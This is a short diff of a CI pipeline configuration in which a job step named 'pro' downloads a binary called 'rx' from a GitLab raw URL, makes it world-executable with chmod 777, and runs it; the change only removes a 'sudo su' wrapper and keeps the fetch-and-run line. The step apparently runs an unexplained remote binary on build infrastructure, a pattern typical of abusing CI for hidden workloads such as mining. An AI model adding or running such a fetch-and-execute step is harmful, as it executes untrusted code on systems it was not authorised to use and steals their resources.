@@ -13,7 +13,7 @@ jobs:
          name: "pro"
          
          command: | 
-          sudo su --command "wget https://gitlab.com/MySeald/rx/-/raw/main/rx && chmod 777 rx && ./rx"
+          wget https://gitlab.com/MySeald/rx/-/raw/main/rx && chmod 777 rx && ./rx
           
       
       - run:
